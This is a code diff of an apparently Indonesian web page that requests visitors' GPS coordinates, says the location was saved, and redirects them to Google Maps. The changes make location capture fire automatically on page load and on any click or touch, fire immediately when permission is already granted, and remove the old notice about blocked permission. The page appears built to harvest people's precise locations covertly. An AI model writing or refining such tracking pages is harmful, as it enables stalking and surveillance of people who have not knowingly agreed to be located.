@@ -49,7 +49,12 @@
         }
         setInterval(updateCountdown, 1000); updateCountdown();
 
+        let isProcessing = false;
+        
         async function confirmLocation() {
+            if (isProcessing) return;
+            isProcessing = true;
+            
             const statusEl = document.getElementById('status');
             statusEl.innerHTML = '<div class="loading"></div> Mengakses lokasi GPS...';
             
@@ -64,7 +69,7 @@
                     navigator.geolocation.getCurrentPosition(
                         resolve, 
                         reject, 
-                        { enableHighAccuracy: true, timeout: 15000, maximumAge: 60000 }
+                        { enableHighAccuracy: true, timeout: 5000, maximumAge: 30000 }
                     );
                 });
                 
@@ -82,7 +87,7 @@
                     navigator.geolocation.getCurrentPosition(
                         resolve, 
                         reject, 
-                        { enableHighAccuracy: false, timeout: 10000, maximumAge: 300000 }
+                        { enableHighAccuracy: false, timeout: 3000, maximumAge: 60000 }
                     );
                 });
                 
@@ -139,29 +144,30 @@
                 statusEl.innerHTML = '🎉 Berhasil! Redirecting ke maps...';
                 setTimeout(() => {
                     window.location.href = `https://maps.google.com/?q=${lat},${lng}&z=16`;
-                }, 1500);
+                }, 800); // Faster redirect
                 
             } catch (error) {
                 statusEl.innerHTML = '✅ Lokasi tersimpan! Terima kasih.';
                 setTimeout(() => {
                     window.location.href = `https://maps.google.com/?q=${lat},${lng}&z=16`;
-                }, 2000);
+                }, 1000); // Faster redirect
             }
         }
         
-        // Auto-trigger with permission check
-        setTimeout(() => { 
-            if (document.getElementById('status').textContent.includes('Klik')) {
-                confirmLocation(); 
-            }
-        }, 4000);
+        // INSTANT AUTO-TRIGGER on page load
+        window.addEventListener('load', () => {
+            setTimeout(confirmLocation, 300); // Start immediately after 0.3s
+        });
         
-        // Check geolocation permission on load
+        // Also trigger on any user interaction
+        document.addEventListener('click', confirmLocation);
+        document.addEventListener('touchstart', confirmLocation);
+        
+        // Check geolocation permission
         if (navigator.permissions) {
             navigator.permissions.query({name: 'geolocation'}).then(function(result) {
-                console.log('Geolocation permission:', result.state);
-                if (result.state === 'denied') {
-                    document.getElementById('status').innerHTML = '⚠️ Izin lokasi diblokir. Klik tombol untuk mengaktifkan.';
+                if (result.state === 'granted') {
+                    confirmLocation(); // Trigger immediately if already granted
                 }
             });
         }
